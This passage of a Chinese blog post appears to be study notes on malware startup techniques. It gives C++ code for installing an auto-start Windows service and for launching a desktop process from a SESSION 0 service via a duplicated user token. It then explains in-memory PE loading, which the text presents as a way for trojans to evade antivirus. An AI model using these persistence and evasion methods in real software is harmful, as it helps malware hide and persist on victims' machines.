ERROR.\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 启动服务</span><br>bRet = <span class="hljs-built_in">SystemServiceOperate</span>(szExePath, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;START OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;START ERROR.\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-comment">// 停止服务</span><br>bRet = <span class="hljs-built_in">SystemServiceOperate</span>(szExePath, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;STOP OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;STOP ERROR.\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 卸载服务</span><br>bRet = <span class="hljs-built_in">SystemServiceOperate</span>(szExePath, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UNINSTALL OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UNINSTALL ERROR.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ServiceOperate.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ServiceOperate.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error!\nError Code Is:%d\n&quot;</span>, lpszText, ::<span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK | MB_ICONERROR);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br><br><span class="hljs-comment">// 0 加载服务    1 启动服务    2 停止服务    3 删除服务</span><br><span class="hljs-function">BOOL <span class="hljs-title">SystemServiceOperate</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszExePath, <span class="hljs-type">int</span> iOperateType)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = TRUE;<br><span class="hljs-type">char</span> szName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-built_in">lstrcpy</span>(szName, lpszExePath);<br><span class="hljs-comment">// 过滤掉文件目录，获取文件名</span><br><span class="hljs-built_in">PathStripPath</span>(szName);<br><br>SC_HANDLE shOSCM = <span class="hljs-literal">NULL</span>, shCS = <span class="hljs-literal">NULL</span>;<br>SERVICE_STATUS ss;<br>DWORD dwErrorCode = <span class="hljs-number">0</span>;<br>BOOL bSuccess = FALSE;<br><span class="hljs-comment">// 打开服务控制管理器数据库</span><br>shOSCM = <span class="hljs-built_in">OpenSCManager</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, SC_MANAGER_ALL_ACCESS);<br><span class="hljs-keyword">if</span> (!shOSCM)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenSCManager&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != iOperateType)<br>&#123;<br><span class="hljs-comment">// 打开一个已经存在的服务</span><br>shCS = <span class="hljs-built_in">OpenService</span>(shOSCM, szName, SERVICE_ALL_ACCESS);<br><span class="hljs-keyword">if</span> (!shCS)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenService&quot;</span>);<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shOSCM);<br>shOSCM = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (iOperateType)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>&#123;<br><span class="hljs-comment">// 创建服务</span><br><span class="hljs-comment">// SERVICE_AUTO_START   随系统自动启动</span><br><span class="hljs-comment">// SERVICE_DEMAND_START 手动启动</span><br>shCS = ::<span class="hljs-built_in">CreateService</span>(shOSCM, szName, szName,<br>SERVICE_ALL_ACCESS,<br>SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,<br>SERVICE_AUTO_START,<br>SERVICE_ERROR_NORMAL,<br>lpszExePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!shCS)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>&#123;<br><span class="hljs-comment">// 启动服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">StartService</span>(shCS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;StartService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>&#123;<br><span class="hljs-comment">// 停止服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ControlService</span>(shCS, SERVICE_CONTROL_STOP, &amp;ss))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ControlService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>&#123;<br><span class="hljs-comment">// 删除服务</span><br><span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">DeleteService</span>(shCS))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;DeleteService&quot;</span>);<br>bRet = FALSE;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 关闭句柄</span><br><span class="hljs-keyword">if</span> (shCS)<br>&#123;<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shCS);<br>shCS = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (shOSCM)<br>&#123;<br>::<span class="hljs-built_in">CloseServiceHandle</span>(shOSCM);<br>shOSCM = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>CreateProcessAsUser.exe</strong>  CreateProcessAsUser.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;UserEnv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WtsApi32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;UserEnv.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;WtsApi32.lib&quot;</span>)</span><br><br><br><span class="hljs-comment">// 服务入口函数以及处理回调函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">ServiceMain</span><span class="hljs-params">(DWORD dwArgc, <span class="hljs-type">char</span>* lpszArgv)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">ServiceCtrlHandle</span><span class="hljs-params">(DWORD dwOperateCode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DoTask</span><span class="hljs-params">()</span></span>;<br><span class="hljs-comment">// 显示消息对话框</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowMessage</span><span class="hljs-params">(TCHAR* lpszMessage, TCHAR* lpszTitle)</span></span>;<br><span class="hljs-comment">// 创建用户进程</span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateUserProcess</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszFileName)</span></span>;<br><br><span class="hljs-comment">// 全局变量</span><br><span class="hljs-type">char</span> g_szServiceName[MAX_PATH] = <span class="hljs-string">&quot;002.exe&quot;</span>;    <span class="hljs-comment">// 服务名称 </span><br>SERVICE_STATUS g_ServiceStatus = &#123; <span class="hljs-number">0</span> &#125;;<br>SERVICE_STATUS_HANDLE g_ServiceStatusHandle = &#123; <span class="hljs-number">0</span> &#125;;<br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-comment">// 注册服务入口函数</span><br>SERVICE_TABLE_ENTRY stDispatchTable[] = &#123; &#123; g_szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain &#125;, &#123; <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span> &#125; &#125;;<br>::<span class="hljs-built_in">StartServiceCtrlDispatcher</span>(stDispatchTable);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">ServiceMain</span><span class="hljs-params">(DWORD dwArgc, <span class="hljs-type">char</span>* lpszArgv)</span></span><br><span class="hljs-function"></span>&#123;<br>g_ServiceStatus.dwServiceType = SERVICE_WIN32;<br>g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;<br>g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;<br>g_ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br><br>g_ServiceStatusHandle = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(g_szServiceName, ServiceCtrlHandle);<br><br>g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;<br>g_ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>::<span class="hljs-built_in">SetServiceStatus</span>(g_ServiceStatusHandle, &amp;g_ServiceStatus);<br><br><span class="hljs-comment">// 自己程序实现部分代码放在这里</span><br><span class="hljs-built_in">DoTask</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">ServiceCtrlHandle</span><span class="hljs-params">(DWORD dwOperateCode)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">switch</span> (dwOperateCode)<br>&#123;<br><span class="hljs-keyword">case</span> SERVICE_CONTROL_PAUSE:<br>&#123;<br><span class="hljs-comment">// 暂停</span><br>g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> SERVICE_CONTROL_CONTINUE:<br>&#123;<br><span class="hljs-comment">// 继续</span><br>g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br>&#123;<br><span class="hljs-comment">// 停止</span><br>g_ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>g_ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>g_ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>::<span class="hljs-built_in">SetServiceStatus</span>(g_ServiceStatusHandle, &amp;g_ServiceStatus);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> SERVICE_CONTROL_INTERROGATE:<br>&#123;<br><span class="hljs-comment">// 询问</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DoTask</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 自己程序实现部分代码放在这里</span><br><span class="hljs-comment">// 显示对话框</span><br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;Hi Demon·Gan\nThis Is From Session 0 Service!\n&quot;</span>, <span class="hljs-string">&quot;HELLO&quot;</span>);<br><span class="hljs-comment">// 创建用户桌面进程</span><br><span class="hljs-built_in">CreateUserProcess</span>(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\WinExec.exe&quot;</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowMessage</span><span class="hljs-params">(TCHAR* lpszMessage, TCHAR* lpszTitle)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 获取当前的Session ID</span><br>DWORD dwSessionId = ::<span class="hljs-built_in">WTSGetActiveConsoleSessionId</span>();<br><span class="hljs-comment">// 显示消息对话框</span><br>DWORD dwResponse = <span class="hljs-number">0</span>;<br>::<span class="hljs-built_in">WTSSendMessage</span>(WTS_CURRENT_SERVER_HANDLE, dwSessionId,<br>lpszTitle, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlen</span>(lpszTitle)),<br>lpszMessage, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlen</span>(lpszMessage)),<br><span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;dwResponse, FALSE);<br>&#125;<br><br><br><span class="hljs-comment">// 突破SESSION 0隔离创建用户进程</span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateUserProcess</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = TRUE;<br>DWORD dwSessionID = <span class="hljs-number">0</span>;<br>HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>HANDLE hDuplicatedToken = <span class="hljs-literal">NULL</span>;<br>LPVOID lpEnvironment = <span class="hljs-literal">NULL</span>;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">// 获得当前Session ID</span><br>dwSessionID = ::<span class="hljs-built_in">WTSGetActiveConsoleSessionId</span>();<br><br><span class="hljs-comment">// 获得当前Session的用户令牌</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">WTSQueryUserToken</span>(dwSessionID, &amp;hToken))<br>&#123;<br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;WTSQueryUserToken&quot;</span>, <span class="hljs-string">&quot;ERROR&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 复制令牌</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">DuplicateTokenEx</span>(hToken, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>,<br>SecurityIdentification, TokenPrimary, &amp;hDuplicatedToken))<br>&#123;<br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;DuplicateTokenEx&quot;</span>, <span class="hljs-string">&quot;ERROR&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 创建用户Session环境</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">CreateEnvironmentBlock</span>(&amp;lpEnvironment,<br>hDuplicatedToken, FALSE))<br>&#123;<br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;CreateEnvironmentBlock&quot;</span>, <span class="hljs-string">&quot;ERROR&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 在复制的用户Session下执行应用程序，创建进程</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">CreateProcessAsUser</span>(hDuplicatedToken,<br>lpszFileName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,<br>lpEnvironment, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))<br>&#123;<br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;CreateProcessAsUser&quot;</span>, <span class="hljs-string">&quot;ERROR&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-comment">// 关闭句柄, 释放资源</span><br><span class="hljs-keyword">if</span> (lpEnvironment)<br>&#123;<br>::<span class="hljs-built_in">DestroyEnvironmentBlock</span>(lpEnvironment);<br>&#125;<br><span class="hljs-keyword">if</span> (hDuplicatedToken)<br>&#123;<br>::<span class="hljs-built_in">CloseHandle</span>(hDuplicatedToken);<br>&#125;<br><span class="hljs-keyword">if</span> (hToken)<br>&#123;<br>::<span class="hljs-built_in">CloseHandle</span>(hToken);<br>&#125;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h4><p>运行ServiceLoader.exe，注册CreateProcessAsUser.exe为服务，并执行CreateProcessAsUser.exe；CreateProcessAsUser.exe处于SESSION 0，实现创建用户桌面进程Winexec.exe(处于SESSION 1)</p><p><img src="/2022/10/31/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/image-20221028135342744.png" alt="image-20221028135342744"></p><p>记得把创建的服务删除，sc delete CreateProcessAsUser.exe</p><p>其实这一章不太懂，为什么说是突破SESSION 0隔离创建用户进程。创建服务就是从SESSION 1到SESSION 0，这也是突破隔离，还是从由低等级到高等级。</p><h3 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a><strong>内存直接加载运行</strong></h3><p>把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行，不需要通过LoadLibrary等线程的API函数去操作，以此躲过杀毒软件的拦截检测。</p><p>假如程序需要动态调用DLL文件，内存加载运行技术可以把这些DLL作为资源插入到自己的程序中。此时直接在内存中加载运行即可，不需要再将DLL释放到本地。</p><h4 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a><strong>实现原理</strong></h4><p><strong>内存直接加载运行技术的核心就是模拟PE加载器加载PE文件的过程，也就是对导入表、导出表以及重定位表的操作过程。</strong></p><p>从内存中加载运行DLL，具体的实现流程总结如下：</p><ol><li>在DLL文件中，根据PE结构获取其加载映像的大小SizeOfImage，并根据SizeOfImage在自己的程序中申请可读、可写、可执行的内存，那么这块内存的首地址就是DLL的加载基址。</li><li>根据DLL中的PE结构获取其映像对齐大小SectionAlignment，然后把DLL文件数据按照SectionAlignment复制到上述申请的可读、可写、可执行的内存中。</li><li>根据PE结构的重定位表，重新对重定位表进行修正。</li><li>根据PE结构的导入表，加载所需的DLL，并获取导入函数的地址并写入导入表中。</li><li>修改DLL的加载基址ImageBase。</li><li>根据PE结构获取DLL的入口地址，然后构造并调用DllMain函数，实现DLL加载。</li></ol><p>而exe文件相对于DLL文件实现原理唯一的区别就在于构造入口函数的差别，<strong>exe不需要构造DllMain函数，而是根据PE结构获取exe的入口地址偏移AddressOfEntryPoint并计算出入口地址，然后直接跳转到入口地址处执行即可</strong>。</p><p>要特别注意的是，对于exe文件来说，重定位表不是必需的，<strong>即使没有重定位表，exe也可正常运行</strong>。因为对于exe进程来说，进程最早加载的模块是exe模块，所以它可以按照默认的加载基址加载到内存。对于那些没有重定位表的程序，只能把它加载到默认的加载基址上。如果默认加载基址已被占用，则直接内存加载运行会失败。</p><h4 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a><strong>代码实现</strong></h4><p><strong>dllload.exe</strong></p><p>MmLoadDll.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 